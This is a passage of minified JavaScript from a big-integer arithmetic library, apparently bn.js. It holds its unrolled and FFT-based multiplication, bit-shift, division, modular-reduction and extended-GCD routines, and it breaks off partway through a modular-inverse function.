i,n,o,s=t.words,a=e.words,u=r.words,l=0,c=0|s[0],h=8191&c,f=c>>>13,d=0|s[1],p=8191&d,g=d>>>13,m=0|s[2],y=8191&m,b=m>>>13,w=0|s[3],v=8191&w,x=w>>>13,k=0|s[4],S=8191&k,B=k>>>13,E=0|s[5],A=8191&E,_=E>>>13,I=0|s[6],M=8191&I,L=I>>>13,T=0|s[7],O=8191&T,P=T>>>13,R=0|s[8],C=8191&R,U=R>>>13,N=0|s[9],z=8191&N,H=N>>>13,q=0|a[0],W=8191&q,F=q>>>13,D=0|a[1],j=8191&D,K=D>>>13,V=0|a[2],$=8191&V,Z=V>>>13,G=0|a[3],J=8191&G,Y=G>>>13,X=0|a[4],Q=8191&X,tt=X>>>13,te=0|a[5],tr=8191&te,ti=te>>>13,tn=0|a[6],to=8191&tn,ts=tn>>>13,ta=0|a[7],tu=8191&ta,tl=ta>>>13,tc=0|a[8],th=8191&tc,tf=tc>>>13,td=0|a[9],tp=8191&td,tg=td>>>13;r.negative=t.negative^e.negative,r.length=19;var tm=(l+(i=Math.imul(h,W))|0)+((8191&(n=(n=Math.imul(h,F))+Math.imul(f,W)|0))<<13)|0;l=((o=Math.imul(f,F))+(n>>>13)|0)+(tm>>>26)|0,tm&=0x3ffffff,i=Math.imul(p,W),n=(n=Math.imul(p,F))+Math.imul(g,W)|0,o=Math.imul(g,F);var ty=(l+(i=i+Math.imul(h,j)|0)|0)+((8191&(n=(n=n+Math.imul(h,K)|0)+Math.imul(f,j)|0))<<13)|0;l=((o=o+Math.imul(f,K)|0)+(n>>>13)|0)+(ty>>>26)|0,ty&=0x3ffffff,i=Math.imul(y,W),n=(n=Math.imul(y,F))+Math.imul(b,W)|0,o=Math.imul(b,F),i=i+Math.imul(p,j)|0,n=(n=n+Math.imul(p,K)|0)+Math.imul(g,j)|0,o=o+Math.imul(g,K)|0;var tb=(l+(i=i+Math.imul(h,$)|0)|0)+((8191&(n=(n=n+Math.imul(h,Z)|0)+Math.imul(f,$)|0))<<13)|0;l=((o=o+Math.imul(f,Z)|0)+(n>>>13)|0)+(tb>>>26)|0,tb&=0x3ffffff,i=Math.imul(v,W),n=(n=Math.imul(v,F))+Math.imul(x,W)|0,o=Math.imul(x,F),i=i+Math.imul(y,j)|0,n=(n=n+Math.imul(y,K)|0)+Math.imul(b,j)|0,o=o+Math.imul(b,K)|0,i=i+Math.imul(p,$)|0,n=(n=n+Math.imul(p,Z)|0)+Math.imul(g,$)|0,o=o+Math.imul(g,Z)|0;var tw=(l+(i=i+Math.imul(h,J)|0)|0)+((8191&(n=(n=n+Math.imul(h,Y)|0)+Math.imul(f,J)|0))<<13)|0;l=((o=o+Math.imul(f,Y)|0)+(n>>>13)|0)+(tw>>>26)|0,tw&=0x3ffffff,i=Math.imul(S,W),n=(n=Math.imul(S,F))+Math.imul(B,W)|0,o=Math.imul(B,F),i=i+Math.imul(v,j)|0,n=(n=n+Math.imul(v,K)|0)+Math.imul(x,j)|0,o=o+Math.imul(x,K)|0,i=i+Math.imul(y,$)|0,n=(n=n+Math.imul(y,Z)|0)+Math.imul(b,$)|0,o=o+Math.imul(b,Z)|0,i=i+Math.imul(p,J)|0,n=(n=n+Math.imul(p,Y)|0)+Math.imul(g,J)|0,o=o+Math.imul(g,Y)|0;var tv=(l+(i=i+Math.imul(h,Q)|0)|0)+((8191&(n=(n=n+Math.imul(h,tt)|0)+Math.imul(f,Q)|0))<<13)|0;l=((o=o+Math.imul(f,tt)|0)+(n>>>13)|0)+(tv>>>26)|0,tv&=0x3ffffff,i=Math.imul(A,W),n=(n=Math.imul(A,F))+Math.imul(_,W)|0,o=Math.imul(_,F),i=i+Math.imul(S,j)|0,n=(n=n+Math.imul(S,K)|0)+Math.imul(B,j)|0,o=o+Math.imul(B,K)|0,i=i+Math.imul(v,$)|0,n=(n=n+Math.imul(v,Z)|0)+Math.imul(x,$)|0,o=o+Math.imul(x,Z)|0,i=i+Math.imul(y,J)|0,n=(n=n+Math.imul(y,Y)|0)+Math.imul(b,J)|0,o=o+Math.imul(b,Y)|0,i=i+Math.imul(p,Q)|0,n=(n=n+Math.imul(p,tt)|0)+Math.imul(g,Q)|0,o=o+Math.imul(g,tt)|0;var tx=(l+(i=i+Math.imul(h,tr)|0)|0)+((8191&(n=(n=n+Math.imul(h,ti)|0)+Math.imul(f,tr)|0))<<13)|0;l=((o=o+Math.imul(f,ti)|0)+(n>>>13)|0)+(tx>>>26)|0,tx&=0x3ffffff,i=Math.imul(M,W),n=(n=Math.imul(M,F))+Math.imul(L,W)|0,o=Math.imul(L,F),i=i+Math.imul(A,j)|0,n=(n=n+Math.imul(A,K)|0)+Math.imul(_,j)|0,o=o+Math.imul(_,K)|0,i=i+Math.imul(S,$)|0,n=(n=n+Math.imul(S,Z)|0)+Math.imul(B,$)|0,o=o+Math.imul(B,Z)|0,i=i+Math.imul(v,J)|0,n=(n=n+Math.imul(v,Y)|0)+Math.imul(x,J)|0,o=o+Math.imul(x,Y)|0,i=i+Math.imul(y,Q)|0,n=(n=n+Math.imul(y,tt)|0)+Math.imul(b,Q)|0,o=o+Math.imul(b,tt)|0,i=i+Math.imul(p,tr)|0,n=(n=n+Math.imul(p,ti)|0)+Math.imul(g,tr)|0,o=o+Math.imul(g,ti)|0;var tk=(l+(i=i+Math.imul(h,to)|0)|0)+((8191&(n=(n=n+Math.imul(h,ts)|0)+Math.imul(f,to)|0))<<13)|0;l=((o=o+Math.imul(f,ts)|0)+(n>>>13)|0)+(tk>>>26)|0,tk&=0x3ffffff,i=Math.imul(O,W),n=(n=Math.imul(O,F))+Math.imul(P,W)|0,o=Math.imul(P,F),i=i+Math.imul(M,j)|0,n=(n=n+Math.imul(M,K)|0)+Math.imul(L,j)|0,o=o+Math.imul(L,K)|0,i=i+Math.imul(A,$)|0,n=(n=n+Math.imul(A,Z)|0)+Math.imul(_,$)|0,o=o+Math.imul(_,Z)|0,i=i+Math.imul(S,J)|0,n=(n=n+Math.imul(S,Y)|0)+Math.imul(B,J)|0,o=o+Math.imul(B,Y)|0,i=i+Math.imul(v,Q)|0,n=(n=n+Math.imul(v,tt)|0)+Math.imul(x,Q)|0,o=o+Math.imul(x,tt)|0,i=i+Math.imul(y,tr)|0,n=(n=n+Math.imul(y,ti)|0)+Math.imul(b,tr)|0,o=o+Math.imul(b,ti)|0,i=i+Math.imul(p,to)|0,n=(n=n+Math.imul(p,ts)|0)+Math.imul(g,to)|0,o=o+Math.imul(g,ts)|0;var tS=(l+(i=i+Math.imul(h,tu)|0)|0)+((8191&(n=(n=n+Math.imul(h,tl)|0)+Math.imul(f,tu)|0))<<13)|0;l=((o=o+Math.imul(f,tl)|0)+(n>>>13)|0)+(tS>>>26)|0,tS&=0x3ffffff,i=Math.imul(C,W),n=(n=Math.imul(C,F))+Math.imul(U,W)|0,o=Math.imul(U,F),i=i+Math.imul(O,j)|0,n=(n=n+Math.imul(O,K)|0)+Math.imul(P,j)|0,o=o+Math.imul(P,K)|0,i=i+Math.imul(M,$)|0,n=(n=n+Math.imul(M,Z)|0)+Math.imul(L,$)|0,o=o+Math.imul(L,Z)|0,i=i+Math.imul(A,J)|0,n=(n=n+Math.imul(A,Y)|0)+Math.imul(_,J)|0,o=o+Math.imul(_,Y)|0,i=i+Math.imul(S,Q)|0,n=(n=n+Math.imul(S,tt)|0)+Math.imul(B,Q)|0,o=o+Math.imul(B,tt)|0,i=i+Math.imul(v,tr)|0,n=(n=n+Math.imul(v,ti)|0)+Math.imul(x,tr)|0,o=o+Math.imul(x,ti)|0,i=i+Math.imul(y,to)|0,n=(n=n+Math.imul(y,ts)|0)+Math.imul(b,to)|0,o=o+Math.imul(b,ts)|0,i=i+Math.imul(p,tu)|0,n=(n=n+Math.imul(p,tl)|0)+Math.imul(g,tu)|0,o=o+Math.imul(g,tl)|0;var tB=(l+(i=i+Math.imul(h,th)|0)|0)+((8191&(n=(n=n+Math.imul(h,tf)|0)+Math.imul(f,th)|0))<<13)|0;l=((o=o+Math.imul(f,tf)|0)+(n>>>13)|0)+(tB>>>26)|0,tB&=0x3ffffff,i=Math.imul(z,W),n=(n=Math.imul(z,F))+Math.imul(H,W)|0,o=Math.imul(H,F),i=i+Math.imul(C,j)|0,n=(n=n+Math.imul(C,K)|0)+Math.imul(U,j)|0,o=o+Math.imul(U,K)|0,i=i+Math.imul(O,$)|0,n=(n=n+Math.imul(O,Z)|0)+Math.imul(P,$)|0,o=o+Math.imul(P,Z)|0,i=i+Math.imul(M,J)|0,n=(n=n+Math.imul(M,Y)|0)+Math.imul(L,J)|0,o=o+Math.imul(L,Y)|0,i=i+Math.imul(A,Q)|0,n=(n=n+Math.imul(A,tt)|0)+Math.imul(_,Q)|0,o=o+Math.imul(_,tt)|0,i=i+Math.imul(S,tr)|0,n=(n=n+Math.imul(S,ti)|0)+Math.imul(B,tr)|0,o=o+Math.imul(B,ti)|0,i=i+Math.imul(v,to)|0,n=(n=n+Math.imul(v,ts)|0)+Math.imul(x,to)|0,o=o+Math.imul(x,ts)|0,i=i+Math.imul(y,tu)|0,n=(n=n+Math.imul(y,tl)|0)+Math.imul(b,tu)|0,o=o+Math.imul(b,tl)|0,i=i+Math.imul(p,th)|0,n=(n=n+Math.imul(p,tf)|0)+Math.imul(g,th)|0,o=o+Math.imul(g,tf)|0;var tE=(l+(i=i+Math.imul(h,tp)|0)|0)+((8191&(n=(n=n+Math.imul(h,tg)|0)+Math.imul(f,tp)|0))<<13)|0;l=((o=o+Math.imul(f,tg)|0)+(n>>>13)|0)+(tE>>>26)|0,tE&=0x3ffffff,i=Math.imul(z,j),n=(n=Math.imul(z,K))+Math.imul(H,j)|0,o=Math.imul(H,K),i=i+Math.imul(C,$)|0,n=(n=n+Math.imul(C,Z)|0)+Math.imul(U,$)|0,o=o+Math.imul(U,Z)|0,i=i+Math.imul(O,J)|0,n=(n=n+Math.imul(O,Y)|0)+Math.imul(P,J)|0,o=o+Math.imul(P,Y)|0,i=i+Math.imul(M,Q)|0,n=(n=n+Math.imul(M,tt)|0)+Math.imul(L,Q)|0,o=o+Math.imul(L,tt)|0,i=i+Math.imul(A,tr)|0,n=(n=n+Math.imul(A,ti)|0)+Math.imul(_,tr)|0,o=o+Math.imul(_,ti)|0,i=i+Math.imul(S,to)|0,n=(n=n+Math.imul(S,ts)|0)+Math.imul(B,to)|0,o=o+Math.imul(B,ts)|0,i=i+Math.imul(v,tu)|0,n=(n=n+Math.imul(v,tl)|0)+Math.imul(x,tu)|0,o=o+Math.imul(x,tl)|0,i=i+Math.imul(y,th)|0,n=(n=n+Math.imul(y,tf)|0)+Math.imul(b,th)|0,o=o+Math.imul(b,tf)|0;var tA=(l+(i=i+Math.imul(p,tp)|0)|0)+((8191&(n=(n=n+Math.imul(p,tg)|0)+Math.imul(g,tp)|0))<<13)|0;l=((o=o+Math.imul(g,tg)|0)+(n>>>13)|0)+(tA>>>26)|0,tA&=0x3ffffff,i=Math.imul(z,$),n=(n=Math.imul(z,Z))+Math.imul(H,$)|0,o=Math.imul(H,Z),i=i+Math.imul(C,J)|0,n=(n=n+Math.imul(C,Y)|0)+Math.imul(U,J)|0,o=o+Math.imul(U,Y)|0,i=i+Math.imul(O,Q)|0,n=(n=n+Math.imul(O,tt)|0)+Math.imul(P,Q)|0,o=o+Math.imul(P,tt)|0,i=i+Math.imul(M,tr)|0,n=(n=n+Math.imul(M,ti)|0)+Math.imul(L,tr)|0,o=o+Math.imul(L,ti)|0,i=i+Math.imul(A,to)|0,n=(n=n+Math.imul(A,ts)|0)+Math.imul(_,to)|0,o=o+Math.imul(_,ts)|0,i=i+Math.imul(S,tu)|0,n=(n=n+Math.imul(S,tl)|0)+Math.imul(B,tu)|0,o=o+Math.imul(B,tl)|0,i=i+Math.imul(v,th)|0,n=(n=n+Math.imul(v,tf)|0)+Math.imul(x,th)|0,o=o+Math.imul(x,tf)|0;var t_=(l+(i=i+Math.imul(y,tp)|0)|0)+((8191&(n=(n=n+Math.imul(y,tg)|0)+Math.imul(b,tp)|0))<<13)|0;l=((o=o+Math.imul(b,tg)|0)+(n>>>13)|0)+(t_>>>26)|0,t_&=0x3ffffff,i=Math.imul(z,J),n=(n=Math.imul(z,Y))+Math.imul(H,J)|0,o=Math.imul(H,Y),i=i+Math.imul(C,Q)|0,n=(n=n+Math.imul(C,tt)|0)+Math.imul(U,Q)|0,o=o+Math.imul(U,tt)|0,i=i+Math.imul(O,tr)|0,n=(n=n+Math.imul(O,ti)|0)+Math.imul(P,tr)|0,o=o+Math.imul(P,ti)|0,i=i+Math.imul(M,to)|0,n=(n=n+Math.imul(M,ts)|0)+Math.imul(L,to)|0,o=o+Math.imul(L,ts)|0,i=i+Math.imul(A,tu)|0,n=(n=n+Math.imul(A,tl)|0)+Math.imul(_,tu)|0,o=o+Math.imul(_,tl)|0,i=i+Math.imul(S,th)|0,n=(n=n+Math.imul(S,tf)|0)+Math.imul(B,th)|0,o=o+Math.imul(B,tf)|0;var tI=(l+(i=i+Math.imul(v,tp)|0)|0)+((8191&(n=(n=n+Math.imul(v,tg)|0)+Math.imul(x,tp)|0))<<13)|0;l=((o=o+Math.imul(x,tg)|0)+(n>>>13)|0)+(tI>>>26)|0,tI&=0x3ffffff,i=Math.imul(z,Q),n=(n=Math.imul(z,tt))+Math.imul(H,Q)|0,o=Math.imul(H,tt),i=i+Math.imul(C,tr)|0,n=(n=n+Math.imul(C,ti)|0)+Math.imul(U,tr)|0,o=o+Math.imul(U,ti)|0,i=i+Math.imul(O,to)|0,n=(n=n+Math.imul(O,ts)|0)+Math.imul(P,to)|0,o=o+Math.imul(P,ts)|0,i=i+Math.imul(M,tu)|0,n=(n=n+Math.imul(M,tl)|0)+Math.imul(L,tu)|0,o=o+Math.imul(L,tl)|0,i=i+Math.imul(A,th)|0,n=(n=n+Math.imul(A,tf)|0)+Math.imul(_,th)|0,o=o+Math.imul(_,tf)|0;var tM=(l+(i=i+Math.imul(S,tp)|0)|0)+((8191&(n=(n=n+Math.imul(S,tg)|0)+Math.imul(B,tp)|0))<<13)|0;l=((o=o+Math.imul(B,tg)|0)+(n>>>13)|0)+(tM>>>26)|0,tM&=0x3ffffff,i=Math.imul(z,tr),n=(n=Math.imul(z,ti))+Math.imul(H,tr)|0,o=Math.imul(H,ti),i=i+Math.imul(C,to)|0,n=(n=n+Math.imul(C,ts)|0)+Math.imul(U,to)|0,o=o+Math.imul(U,ts)|0,i=i+Math.imul(O,tu)|0,n=(n=n+Math.imul(O,tl)|0)+Math.imul(P,tu)|0,o=o+Math.imul(P,tl)|0,i=i+Math.imul(M,th)|0,n=(n=n+Math.imul(M,tf)|0)+Math.imul(L,th)|0,o=o+Math.imul(L,tf)|0;var tL=(l+(i=i+Math.imul(A,tp)|0)|0)+((8191&(n=(n=n+Math.imul(A,tg)|0)+Math.imul(_,tp)|0))<<13)|0;l=((o=o+Math.imul(_,tg)|0)+(n>>>13)|0)+(tL>>>26)|0,tL&=0x3ffffff,i=Math.imul(z,to),n=(n=Math.imul(z,ts))+Math.imul(H,to)|0,o=Math.imul(H,ts),i=i+Math.imul(C,tu)|0,n=(n=n+Math.imul(C,tl)|0)+Math.imul(U,tu)|0,o=o+Math.imul(U,tl)|0,i=i+Math.imul(O,th)|0,n=(n=n+Math.imul(O,tf)|0)+Math.imul(P,th)|0,o=o+Math.imul(P,tf)|0;var tT=(l+(i=i+Math.imul(M,tp)|0)|0)+((8191&(n=(n=n+Math.imul(M,tg)|0)+Math.imul(L,tp)|0))<<13)|0;l=((o=o+Math.imul(L,tg)|0)+(n>>>13)|0)+(tT>>>26)|0,tT&=0x3ffffff,i=Math.imul(z,tu),n=(n=Math.imul(z,tl))+Math.imul(H,tu)|0,o=Math.imul(H,tl),i=i+Math.imul(C,th)|0,n=(n=n+Math.imul(C,tf)|0)+Math.imul(U,th)|0,o=o+Math.imul(U,tf)|0;var tO=(l+(i=i+Math.imul(O,tp)|0)|0)+((8191&(n=(n=n+Math.imul(O,tg)|0)+Math.imul(P,tp)|0))<<13)|0;l=((o=o+Math.imul(P,tg)|0)+(n>>>13)|0)+(tO>>>26)|0,tO&=0x3ffffff,i=Math.imul(z,th),n=(n=Math.imul(z,tf))+Math.imul(H,th)|0,o=Math.imul(H,tf);var tP=(l+(i=i+Math.imul(C,tp)|0)|0)+((8191&(n=(n=n+Math.imul(C,tg)|0)+Math.imul(U,tp)|0))<<13)|0;l=((o=o+Math.imul(U,tg)|0)+(n>>>13)|0)+(tP>>>26)|0,tP&=0x3ffffff;var tR=(l+(i=Math.imul(z,tp))|0)+((8191&(n=(n=Math.imul(z,tg))+Math.imul(H,tp)|0))<<13)|0;return l=((o=Math.imul(H,tg))+(n>>>13)|0)+(tR>>>26)|0,tR&=0x3ffffff,u[0]=tm,u[1]=ty,u[2]=tb,u[3]=tw,u[4]=tv,u[5]=tx,u[6]=tk,u[7]=tS,u[8]=tB,u[9]=tE,u[10]=tA,u[11]=t_,u[12]=tI,u[13]=tM,u[14]=tL,u[15]=tT,u[16]=tO,u[17]=tP,u[18]=tR,0!==l&&(u[19]=l,r.length++),r};function y(t,e,r){r.negative=e.negative^t.negative,r.length=t.length+e.length;for(var i=0,n=0,o=0;o<r.length-1;o++){var s=n;n=0;for(var a=0x3ffffff&i,u=Math.min(o,e.length-1),l=Math.max(0,o-t.length+1);l<=u;l++){var c=o-l,h=(0|t.words[c])*(0|e.words[l]),f=0x3ffffff&h;s=s+(h/0x4000000|0)|0,a=0x3ffffff&(f=f+a|0),n+=(s=s+(f>>>26)|0)>>>26,s&=0x3ffffff}r.words[o]=a,i=s,s=n}return 0!==i?r.words[o]=i:r.length--,r._strip()}function b(t,e){this.x=t,this.y=e}Math.imul||(m=g),n.prototype.mulTo=function(t,e){var r,i=this.length+t.length;return 10===this.length&&10===t.length?m(this,t,e):i<63?g(this,t,e):y(this,t,e)},b.prototype.makeRBT=function(t){for(var e=Array(t),r=n.prototype._countBits(t)-1,i=0;i<t;i++)e[i]=this.revBin(i,r,t);return e},b.prototype.revBin=function(t,e,r){if(0===t||t===r-1)return t;for(var i=0,n=0;n<e;n++)i|=(1&t)<<e-n-1,t>>=1;return i},b.prototype.permute=function(t,e,r,i,n,o){for(var s=0;s<o;s++)i[s]=e[t[s]],n[s]=r[t[s]]},b.prototype.transform=function(t,e,r,i,n,o){this.permute(o,t,e,r,i,n);for(var s=1;s<n;s<<=1)for(var a=s<<1,u=Math.cos(2*Math.PI/a),l=Math.sin(2*Math.PI/a),c=0;c<n;c+=a)for(var h=u,f=l,d=0;d<s;d++){var p=r[c+d],g=i[c+d],m=r[c+d+s],y=i[c+d+s],b=h*m-f*y;y=h*y+f*m,m=b,r[c+d]=p+m,i[c+d]=g+y,r[c+d+s]=p-m,i[c+d+s]=g-y,d!==a&&(b=u*h-l*f,f=u*f+l*h,h=b)}},b.prototype.guessLen13b=function(t,e){var r=1|Math.max(e,t),i=1&r,n=0;for(r=r/2|0;r;r>>>=1)n++;return 1<<n+1+i},b.prototype.conjugate=function(t,e,r){if(!(r<=1))for(var i=0;i<r/2;i++){var n=t[i];t[i]=t[r-i-1],t[r-i-1]=n,n=e[i],e[i]=-e[r-i-1],e[r-i-1]=-n}},b.prototype.normalize13b=function(t,e){for(var r=0,i=0;i<e/2;i++){var n=8192*Math.round(t[2*i+1]/e)+Math.round(t[2*i]/e)+r;t[i]=0x3ffffff&n,r=n<0x4000000?0:n/0x4000000|0}return t},b.prototype.convert13b=function(t,e,i,n){for(var o=0,s=0;s<e;s++)o+=0|t[s],i[2*s]=8191&o,o>>>=13,i[2*s+1]=8191&o,o>>>=13;for(s=2*e;s<n;++s)i[s]=0;r(0===o),r((-8192&o)==0)},b.prototype.stub=function(t){for(var e=Array(t),r=0;r<t;r++)e[r]=0;return e},b.prototype.mulp=function(t,e,r){var i=2*this.guessLen13b(t.length,e.length),n=this.makeRBT(i),o=this.stub(i),s=Array(i),a=Array(i),u=Array(i),l=Array(i),c=Array(i),h=Array(i),f=r.words;f.length=i,this.convert13b(t.words,t.length,s,i),this.convert13b(e.words,e.length,l,i),this.transform(s,o,a,u,i,n),this.transform(l,o,c,h,i,n);for(var d=0;d<i;d++){var p=a[d]*c[d]-u[d]*h[d];u[d]=a[d]*h[d]+u[d]*c[d],a[d]=p}return this.conjugate(a,u,i),this.transform(a,u,f,o,i,n),this.conjugate(f,o,i),this.normalize13b(f,i),r.negative=t.negative^e.negative,r.length=t.length+e.length,r._strip()},n.prototype.mul=function(t){var e=new n(null);return e.words=Array(this.length+t.length),this.mulTo(t,e)},n.prototype.mulf=function(t){var e=new n(null);return e.words=Array(this.length+t.length),y(this,t,e)},n.prototype.imul=function(t){return this.clone().mulTo(t,this)},n.prototype.imuln=function(t){var e=t<0;e&&(t=-t),r("number"==typeof t),r(t<0x4000000);for(var i=0,n=0;n<this.length;n++){var o=(0|this.words[n])*t,s=(0x3ffffff&o)+(0x3ffffff&i);i>>=26,i+=(o/0x4000000|0)+(s>>>26),this.words[n]=0x3ffffff&s}return 0!==i&&(this.words[n]=i,this.length++),e?this.ineg():this},n.prototype.muln=function(t){return this.clone().imuln(t)},n.prototype.sqr=function(){return this.mul(this)},n.prototype.isqr=function(){return this.imul(this.clone())},n.prototype.pow=function(t){var e=function(t){for(var e=Array(t.bitLength()),r=0;r<e.length;r++){var i=r/26|0,n=r%26;e[r]=t.words[i]>>>n&1}return e}(t);if(0===e.length)return new n(1);for(var r=this,i=0;i<e.length&&0===e[i];i++,r=r.sqr());if(++i<e.length)for(var o=r.sqr();i<e.length;i++,o=o.sqr())0!==e[i]&&(r=r.mul(o));return r},n.prototype.iushln=function(t){r("number"==typeof t&&t>=0);var e,i=t%26,n=(t-i)/26,o=0x3ffffff>>>26-i<<26-i;if(0!==i){var s=0;for(e=0;e<this.length;e++){var a=this.words[e]&o,u=(0|this.words[e])-a<<i;this.words[e]=u|s,s=a>>>26-i}s&&(this.words[e]=s,this.length++)}if(0!==n){for(e=this.length-1;e>=0;e--)this.words[e+n]=this.words[e];for(e=0;e<n;e++)this.words[e]=0;this.length+=n}return this._strip()},n.prototype.ishln=function(t){return r(0===this.negative),this.iushln(t)},n.prototype.iushrn=function(t,e,i){r("number"==typeof t&&t>=0),n=e?(e-e%26)/26:0;var n,o=t%26,s=Math.min((t-o)/26,this.length),a=0x3ffffff^0x3ffffff>>>o<<o;if(n-=s,n=Math.max(0,n),i){for(var u=0;u<s;u++)i.words[u]=this.words[u];i.length=s}if(0===s);else if(this.length>s)for(this.length-=s,u=0;u<this.length;u++)this.words[u]=this.words[u+s];else this.words[0]=0,this.length=1;var l=0;for(u=this.length-1;u>=0&&(0!==l||u>=n);u--){var c=0|this.words[u];this.words[u]=l<<26-o|c>>>o,l=c&a}return i&&0!==l&&(i.words[i.length++]=l),0===this.length&&(this.words[0]=0,this.length=1),this._strip()},n.prototype.ishrn=function(t,e,i){return r(0===this.negative),this.iushrn(t,e,i)},n.prototype.shln=function(t){return this.clone().ishln(t)},n.prototype.ushln=function(t){return this.clone().iushln(t)},n.prototype.shrn=function(t){return this.clone().ishrn(t)},n.prototype.ushrn=function(t){return this.clone().iushrn(t)},n.prototype.testn=function(t){r("number"==typeof t&&t>=0);var e=t%26,i=(t-e)/26;return!(this.length<=i)&&!!(this.words[i]&1<<e)},n.prototype.imaskn=function(t){r("number"==typeof t&&t>=0);var e=t%26,i=(t-e)/26;return(r(0===this.negative,"imaskn works only with positive numbers"),this.length<=i)?this:(0!==e&&i++,this.length=Math.min(i,this.length),0!==e&&(this.words[this.length-1]&=0x3ffffff^0x3ffffff>>>e<<e),this._strip())},n.prototype.maskn=function(t){return this.clone().imaskn(t)},n.prototype.iaddn=function(t){return(r("number"==typeof t),r(t<0x4000000),t<0)?this.isubn(-t):0!==this.negative?(1===this.length&&(0|this.words[0])<=t?(this.words[0]=t-(0|this.words[0]),this.negative=0):(this.negative=0,this.isubn(t),this.negative=1),this):this._iaddn(t)},n.prototype._iaddn=function(t){this.words[0]+=t;for(var e=0;e<this.length&&this.words[e]>=0x4000000;e++)this.words[e]-=0x4000000,e===this.length-1?this.words[e+1]=1:this.words[e+1]++;return this.length=Math.max(this.length,e+1),this},n.prototype.isubn=function(t){if(r("number"==typeof t),r(t<0x4000000),t<0)return this.iaddn(-t);if(0!==this.negative)return this.negative=0,this.iaddn(t),this.negative=1,this;if(this.words[0]-=t,1===this.length&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var e=0;e<this.length&&this.words[e]<0;e++)this.words[e]+=0x4000000,this.words[e+1]-=1;return this._strip()},n.prototype.addn=function(t){return this.clone().iaddn(t)},n.prototype.subn=function(t){return this.clone().isubn(t)},n.prototype.iabs=function(){return this.negative=0,this},n.prototype.abs=function(){return this.clone().iabs()},n.prototype._ishlnsubmul=function(t,e,i){var n,o,s=t.length+i;this._expand(s);var a=0;for(n=0;n<t.length;n++){o=(0|this.words[n+i])+a;var u=(0|t.words[n])*e;o-=0x3ffffff&u,a=(o>>26)-(u/0x4000000|0),this.words[n+i]=0x3ffffff&o}for(;n<this.length-i;n++)a=(o=(0|this.words[n+i])+a)>>26,this.words[n+i]=0x3ffffff&o;if(0===a)return this._strip();for(r(-1===a),a=0,n=0;n<this.length;n++)a=(o=-(0|this.words[n])+a)>>26,this.words[n]=0x3ffffff&o;return this.negative=1,this._strip()},n.prototype._wordDiv=function(t,e){var r,i=this.length-t.length,o=this.clone(),s=t,a=0|s.words[s.length-1];0!=(i=26-this._countBits(a))&&(s=s.ushln(i),o.iushln(i),a=0|s.words[s.length-1]);var u=o.length-s.length;if("mod"!==e){(r=new n(null)).length=u+1,r.words=Array(r.length);for(var l=0;l<r.length;l++)r.words[l]=0}var c=o.clone()._ishlnsubmul(s,1,u);0===c.negative&&(o=c,r&&(r.words[u]=1));for(var h=u-1;h>=0;h--){var f=(0|o.words[s.length+h])*0x4000000+(0|o.words[s.length+h-1]);for(f=Math.min(f/a|0,0x3ffffff),o._ishlnsubmul(s,f,h);0!==o.negative;)f--,o.negative=0,o._ishlnsubmul(s,1,h),o.isZero()||(o.negative^=1);r&&(r.words[h]=f)}return r&&r._strip(),o._strip(),"div"!==e&&0!==i&&o.iushrn(i),{div:r||null,mod:o}},n.prototype.divmod=function(t,e,i){var o,s,a;return(r(!t.isZero()),this.isZero())?{div:new n(0),mod:new n(0)}:0!==this.negative&&0===t.negative?(a=this.neg().divmod(t,e),"mod"!==e&&(o=a.div.neg()),"div"!==e&&(s=a.mod.neg(),i&&0!==s.negative&&s.iadd(t)),{div:o,mod:s}):0===this.negative&&0!==t.negative?(a=this.divmod(t.neg(),e),"mod"!==e&&(o=a.div.neg()),{div:o,mod:a.mod}):(this.negative&t.negative)!=0?(a=this.neg().divmod(t.neg(),e),"div"!==e&&(s=a.mod.neg(),i&&0!==s.negative&&s.isub(t)),{div:a.div,mod:s}):t.length>this.length||0>this.cmp(t)?{div:new n(0),mod:this}:1===t.length?"div"===e?{div:this.divn(t.words[0]),mod:null}:"mod"===e?{div:null,mod:new n(this.modrn(t.words[0]))}:{div:this.divn(t.words[0]),mod:new n(this.modrn(t.words[0]))}:this._wordDiv(t,e)},n.prototype.div=function(t){return this.divmod(t,"div",!1).div},n.prototype.mod=function(t){return this.divmod(t,"mod",!1).mod},n.prototype.umod=function(t){return this.divmod(t,"mod",!0).mod},n.prototype.divRound=function(t){var e=this.divmod(t);if(e.mod.isZero())return e.div;var r=0!==e.div.negative?e.mod.isub(t):e.mod,i=t.ushrn(1),n=t.andln(1),o=r.cmp(i);return o<0||1===n&&0===o?e.div:0!==e.div.negative?e.div.isubn(1):e.div.iaddn(1)},n.prototype.modrn=function(t){var e=t<0;e&&(t=-t),r(t<=0x3ffffff);for(var i=0x4000000%t,n=0,o=this.length-1;o>=0;o--)n=(i*n+(0|this.words[o]))%t;return e?-n:n},n.prototype.modn=function(t){return this.modrn(t)},n.prototype.idivn=function(t){var e=t<0;e&&(t=-t),r(t<=0x3ffffff);for(var i=0,n=this.length-1;n>=0;n--){var o=(0|this.words[n])+0x4000000*i;this.words[n]=o/t|0,i=o%t}return this._strip(),e?this.ineg():this},n.prototype.divn=function(t){return this.clone().idivn(t)},n.prototype.egcd=function(t){r(0===t.negative),r(!t.isZero());var e=this,i=t.clone();e=0!==e.negative?e.umod(t):e.clone();for(var o=new n(1),s=new n(0),a=new n(0),u=new n(1),l=0;e.isEven()&&i.isEven();)e.iushrn(1),i.iushrn(1),++l;for(var c=i.clone(),h=e.clone();!e.isZero();){for(var f=0,d=1;(e.words[0]&d)==0&&f<26;++f,d<<=1);if(f>0)for(e.iushrn(f);f-- >0;)(o.isOdd()||s.isOdd())&&(o.iadd(c),s.isub(h)),o.iushrn(1),s.iushrn(1);for(var p=0,g=1;(i.words[0]&g)==0&&p<26;++p,g<<=1);if(p>0)for(i.iushrn(p);p-- >0;)(a.isOdd()||u.isOdd())&&(a.iadd(c),u.isub(h)),a.iushrn(1),u.iushrn(1);e.cmp(i)>=0?(e.isub(i),o.isub(a),s.isub(u)):(i.isub(e),a.isub(o),u.isub(s))}return{a:a,b:u,gcd:i.iushln(l)}},n.prototype._invmp=function(t){r(0===t.negative),r(!t.isZero());var e,i=this,o=t.clone();i=0!==i.negative?i.umod(t):i.clone();for(var s=new n(1),a=new n(0),u=o.clone();i.cmpn(1)>0&&o.cmpn(1)>0;){for(var l=0,c=1;(i.words[0]&c)==0&&l<26;++l,c<<=1);if(l>0)for(i.iushrn(l);l-- >0;)s.isOdd()&&s.iadd(u),s.iushrn(1);for(var h=0,f=1;(o.words[0]&f)==0&&h<26;++h,f<<=1);if(h>0)for(o.iushrn(h);h-- 